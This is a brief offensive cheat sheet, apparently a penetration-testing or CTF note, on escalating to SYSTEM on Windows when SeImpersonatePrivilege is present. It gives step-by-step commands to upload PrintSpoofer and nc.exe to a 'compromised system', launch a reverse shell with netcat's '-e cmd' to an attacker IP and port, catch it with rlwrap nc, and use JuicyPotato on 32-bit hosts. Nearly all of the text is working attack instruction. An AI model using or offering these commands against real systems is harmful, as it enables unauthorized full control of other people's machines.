For x64 bit:
When we do whoami /priv and see SeImpersonatePrivilege you have SYSTEM priv esc :)

Copy PrintSpoofer.exe to compromised system.

Run the following command for SYSTEM Shell:
1. Upload nc.exe
2. .\ps.exe -c "C:\writablepath\nc.exe ipaddress port -e cmd"
3. rlwrap nc ip port
4. B00M -> SYSTEM :)

For x32 bit:
Use juicypotato.exe
